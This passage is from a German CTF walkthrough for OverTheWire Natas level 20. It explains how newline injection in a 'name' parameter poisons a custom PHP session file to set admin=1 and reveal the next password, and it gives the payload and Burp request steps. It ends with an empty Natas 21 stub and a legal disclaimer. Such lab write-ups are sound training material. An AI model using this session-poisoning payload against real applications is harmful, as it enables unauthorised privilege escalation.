- **Implikation:** Wenn ein Angreifer ein Newline-Zeichen (`\n`) innerhalb des `name`-Parameters einschleust, wird dieses Newline-Zeichen in die Session-Datei geschrieben. Dadurch kann der Angreifer die Datenstruktur der Session-Datei manipulieren und neue, eigene Schlüssel-Wert-Paare in die Datei injizieren.


Die `myread()`-Funktion liest diese manipulierte Datei beim nächsten Laden der Seite:

```php
function myread($sid){
    // ... (Prüfungen für $sid) ...
    
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        $parts = explode(" ", $line, 2);
        if($parts[0] != "") {
            $_SESSION[$parts[0]] = $parts[1]; // <-- ANGRIFFSZIELE
        }
    }
}
```

- **Fakt:** `myread` liest die Datei, trennt sie an jedem Newline-Zeichen (`\n`) und erstellt aus jeder Zeile ein `$_SESSION`-Array-Element.


**So kommst du an das Passwort:**

**1. Exploit-Durchführung in zwei Phasen**

**1.1 Angriffsphase 1 - Session Poisoning**

Das Ziel ist, einen `POST`-Request zu senden, der den `name`-Parameter so manipuliert, dass die `mywrite`-Funktion die Zeile `admin 1` in unsere Session-Datei schreibt.

- Rufe die `natas20`-Seite auf. Dein Browser erhält eine gültige `PHPSESSID`. Behalte dieses Cookie.

- Sende einen `POST`-Request (z.B. mit Burp Repeater) an `/index.php`.

- Stelle sicher, dass dein gültiges `PHPSESSID`-Cookie gesendet wird.

- Setze den `POST`-Body (den `name`-Parameter) auf den folgenden Payload:

```HTTP
name=%0Aadmin%201
```

**Was passiert im Backend (`mywrite`):**

- `$_SESSION["name"]` wird auf "`\nadmin 1`" gesetzt.

- `mywrite` iteriert durch `$_SESSION`:

- Es schreibt: name `\nadmin 1\n`

- Die Session-Datei (z.B. `PHPSESSID`) enthält nun buchstäblich zwei Zeilen Text:
```text
name \n
admin 1
```

**1.2. Phase 2: Session-Daten lesen (Admin-Status aktivieren)**

Das "Gift" ist platziert. Jetzt muss die Anwendung die "vergiftete" Datei lesen.

1. Lade die Seite `/index.php` erneut im Browser (oder mit Burp Repeater).

2. Stelle sicher, dass dasselbe `PHPSESSID`-Cookie gesendet wird.

3. **Was passiert im Backend (`myread`):**

    - Der Server ruft myread("`PHPSESSID...`") auf.

    - Die Funktion liest die manipulierte Datei.

    - Sie explodiert am `\n`:

        - **Zeile 1:** `name` ⟹ `$_SESSION["name"] = "\n"`

        - **Zeile 2:** `admin 1` ⟹ `$_SESSION["admin"] = "1"`

    - Der `myread`-Prozess ist abgeschlossen.

4. Ergebnis: Die `print_credentials()`-Funktion wird ausgeführt, sieht `$_SESSION["admin"] == 1` und gibt das Passwort für `natas21` aus.


![Natas20 Hauptseite](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas21c.png)



</details>



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>



## Natas 21 -> 22

```text
Username:   natas21

URL:        http://natas21.natas.labs.overthewire.org
```

<details>
    <summary>Lösung</summary>


</details>


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** November 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---
